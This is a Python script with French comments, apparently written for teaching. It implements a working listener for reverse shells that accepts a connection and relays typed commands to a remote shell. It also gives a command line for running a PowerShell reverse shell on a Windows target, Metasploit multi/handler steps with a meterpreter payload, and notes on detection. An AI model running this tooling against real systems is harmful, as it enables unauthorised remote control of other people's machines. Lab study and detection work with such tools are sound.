#!/usr/bin/env python3
"""
============================================================================
LISTENER PEDAGOGIQUE - REVERSE SHELL RECEIVER
============================================================================

USAGE: LAB PERSONNEL UNIQUEMENT - ENVIRONNEMENT ISOLE

Ce script est un listener simple pour recevoir des connexions reverse shell
dans un contexte educatif et pedagogique.

IMPORTANT:
- A utiliser UNIQUEMENT dans votre laboratoire personnel
- Environnement reseau isole
- Objectif: APPRENTISSAGE et COMPREHENSION

POUR ENGAGEMENTS PROFESSIONNELS:
--> Utilisez Metasploit multi/handler
--> Gestion de sessions robuste
--> Logging complet

============================================================================
"""

import socket
import sys
import argparse
from datetime import datetime


def print_banner():
    """Affiche le banner pedagogique"""
    banner = """
    ╔════════════════════════════════════════════════════════════╗
    ║         LISTENER PEDAGOGIQUE - LAB ONLY                    ║
    ╠════════════════════════════════════════════════════════════╣
    ║  Usage: Lab personnel isole uniquement                     ║
    ║  Objectif: Apprentissage et comprehension                  ║
    ║                                                            ║
    ║  Pour engagements reels: Utilisez Metasploit              ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)


def start_listener(host, port):
    """
    Demarre un listener TCP pour recevoir des reverse shells

    Args:
        host (str): Adresse IP d'ecoute (0.0.0.0 pour toutes interfaces)
        port (int): Port d'ecoute

    Comment ca fonctionne:
    1. Cree un socket TCP
    2. Bind sur l'adresse et port specifies
    3. Ecoute pour connexions entrantes
    4. Accepte une connexion
    5. Interagit avec le shell distant
    """

    print(f"[*] Demarrage du listener pedagogique...")
    print(f"[*] Adresse: {host}:{port}")
    print(f"[*] Heure: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # ========================================================================
    # ETAPE 1: CREATION DU SOCKET
    # ========================================================================
    print("[1] Creation du socket TCP...")

    try:
        # socket.AF_INET = IPv4
        # socket.SOCK_STREAM = TCP (vs UDP qui serait SOCK_DGRAM)
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # SO_REUSEADDR permet de reutiliser le port immediatement
        # Utile si script s'arrete et redémarre rapidement
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        print("[+] Socket cree avec succes")

    except Exception as e:
        print(f"[-] Erreur creation socket: {e}")
        sys.exit(1)

    # ========================================================================
    # ETAPE 2: BIND SUR L'ADRESSE ET LE PORT
    # ========================================================================
    print(f"[2] Bind sur {host}:{port}...")

    try:
        # "Attacher" le socket a l'adresse et port
        server_socket.bind((host, port))
        print(f"[+] Bind reussi sur {host}:{port}")

    except Exception as e:
        print(f"[-] Erreur bind: {e}")
        print(f"[!] Le port {port} est peut-etre deja utilise")
        print(f"[!] Essayez: sudo lsof -i :{port}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # ETAPE 3: ECOUTE POUR CONNEXIONS ENTRANTES
    # ========================================================================
    print("[3] Ecoute pour connexions entrantes...")

    try:
        # listen(1) = accepter 1 connexion en attente maximum
        # Pour un listener simple, 1 suffit
        server_socket.listen(1)
        print(f"[+] Listener actif - en attente de connexion...")
        print(f"[*] Executez le reverse shell sur la machine cible maintenant")
        print()

    except Exception as e:
        print(f"[-] Erreur listen: {e}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # ETAPE 4: ACCEPTER LA CONNEXION
    # ========================================================================
    print("[4] En attente de connexion reverse shell...")

    try:
        # accept() est BLOQUANT - attend qu'une connexion arrive
        # Retourne: (socket client, adresse client)
        client_socket, client_address = server_socket.accept()

        print()
        print("[+] " + "="*60)
        print(f"[+] CONNEXION RECUE!")
        print(f"[+] Adresse client: {client_address[0]}:{client_address[1]}")
        print(f"[+] Heure: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("[+] " + "="*60)
        print()

    except KeyboardInterrupt:
        print("\n[-] Interruption par l'utilisateur (Ctrl+C)")
        server_socket.close()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Erreur accept: {e}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # ETAPE 5: INTERACTION AVEC LE SHELL
    # ========================================================================
    print("[5] Shell actif - interaction commencee")
    print()
    print("[*] Commandes disponibles:")
    print("    - help: Aide")
    print("    - exit: Fermer connexion")
    print("    - <commande>: Executer sur cible")
    print()

    try:
        # Recevoir et afficher le banner du reverse shell
        banner = receive_until_prompt(client_socket)
        if banner:
            print(banner)

        # Boucle d'interaction
        while True:
            # Recevoir le prompt du reverse shell (ex: "PS C:\> ")
            prompt = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not prompt:
                print("\n[-] Connexion fermee par le client")
                break

            # Afficher le prompt
            print(prompt, end='', flush=True)

            # Lire commande de l'utilisateur (nous)
            try:
                command = input()
            except EOFError:
                # Ctrl+D pressed
                print("\n[*] EOF detecte - fermeture connexion")
                command = "exit"

            # Envoyer commande au reverse shell
            client_socket.send((command + "\n").encode('utf-8'))

            # Si commande 'exit', sortir proprement
            if command.strip().lower() == 'exit':
                print("[*] Commande 'exit' envoyee - fermeture...")
                break

            # Recevoir et afficher le resultat
            result = receive_until_prompt(client_socket)
            if result:
                print(result, end='')

            # Si plus de donnees, connexion fermee
            if not result:
                print("\n[-] Connexion fermee par le client")
                break

    except KeyboardInterrupt:
        print("\n[*] Interruption par l'utilisateur (Ctrl+C)")
    except Exception as e:
        print(f"\n[-] Erreur durant interaction: {e}")
    finally:
        print("\n[*] Fermeture de la connexion...")
        client_socket.close()
        server_socket.close()
        print("[+] Listener termine proprement")


def receive_until_prompt(sock, buffer_size=4096):
    """
    Recoit des donnees jusqu'a ce qu'un prompt soit detecte

    Args:
        sock: Socket client
        buffer_size: Taille du buffer de reception

    Returns:
        str: Donnees recues
    """
    data = b""
    try:
        while True:
            chunk = sock.recv(buffer_size)
            if not chunk:
                break
            data += chunk

            # Simple heuristique: si se termine par "> ", c'est probablement un prompt
            # Ceci est tres basique et pourrait etre ameliore
            if data.endswith(b"> "):
                # Enlever le prompt final
                data = data[:-2]
                break

            # Timeout simple: si moins que buffer complet, on a probablement tout recu
            if len(chunk) < buffer_size:
                break

    except socket.timeout:
        pass
    except Exception as e:
        print(f"[-] Erreur reception: {e}")

    return data.decode('utf-8', errors='ignore')


def main():
    """Fonction principale"""

    parser = argparse.ArgumentParser(
        description='Listener pedagogique pour reverse shells (LAB ONLY)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  # Ecouter sur toutes interfaces, port 4444
  python listener.py -p 4444

  # Ecouter sur interface specifique
  python listener.py -H 192.168.100.10 -p 4444

  # Avec verbose
  python listener.py -p 4444 -v

IMPORTANT:
  - Usage LAB PERSONNEL uniquement
  - Environnement isole
  - Pour engagements reels: Metasploit multi/handler

Sur la machine cible (Windows):
  powershell.exe -File basic-reverse-shell.ps1 -ListenerIP <IP> -ListenerPort <PORT>
        """
    )

    parser.add_argument(
        '-H', '--host',
        default='0.0.0.0',
        help='Adresse IP d\'ecoute (default: 0.0.0.0 = toutes interfaces)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        required=True,
        help='Port d\'ecoute (ex: 4444)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Mode verbose'
    )

    args = parser.parse_args()

    # Afficher banner
    print_banner()

    # Verifier port valide
    if args.port < 1 or args.port > 65535:
        print(f"[-] Port invalide: {args.port}")
        print("[!] Port doit etre entre 1 et 65535")
        sys.exit(1)

    # Verifier port privilegie (< 1024 necessite root)
    if args.port < 1024:
        print(f"[!] ATTENTION: Port {args.port} est privilegie")
        print(f"[!] Peut necessiter sudo/root")
        print()

    # Demarrer listener
    try:
        start_listener(args.host, args.port)
    except Exception as e:
        print(f"[-] Erreur fatale: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()


# ============================================================================
# NOTES PEDAGOGIQUES
# ============================================================================

"""
COMMENT CA FONCTIONNE:

1. SOCKET TCP:
   - socket() cree un endpoint de communication
   - bind() attache le socket a une adresse
   - listen() passe en mode ecoute
   - accept() attend et accepte une connexion

2. INTERACTION:
   - recv() pour recevoir des donnees
   - send() pour envoyer des donnees
   - Boucle jusqu'a 'exit' ou deconnexion

3. ENCODAGE:
   - TCP transmet des bytes, pas du texte
   - encode('utf-8') convertit str -> bytes
   - decode('utf-8') convertit bytes -> str

POURQUOI C'EST SIMPLE:

Ce listener est volontairement basique pour apprentissage:
- Pas de gestion de sessions multiples
- Pas d'encryption
- Gestion d'erreurs minimale
- Pas de logging avance

POUR ENGAGEMENTS PROFESSIONNELS:

Utilisez Metasploit multi/handler:

  msfconsole
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST <your-ip>
  set LPORT 4444
  exploit

AVANTAGES METASPLOIT:

- Gestion de sessions multiples
- Post-exploitation integree
- Logging automatique
- Encryption disponible (reverse_https)
- Reconnaissance par clients
- Support et documentation

POUR ALLER PLUS LOIN:

- Capturer le trafic avec Wireshark
- Voir le texte clair (pas d'encryption)
- Comparer avec Meterpreter (encrypte)
- Ajouter logging dans ce script
- Tester detection avec Sysmon

DETECTION:

Ce listener sera visible dans:
- netstat (port en LISTEN)
- Logs firewall
- Network monitoring (IDS/IPS)
- Si connexion etablie: trafic suspect
"""
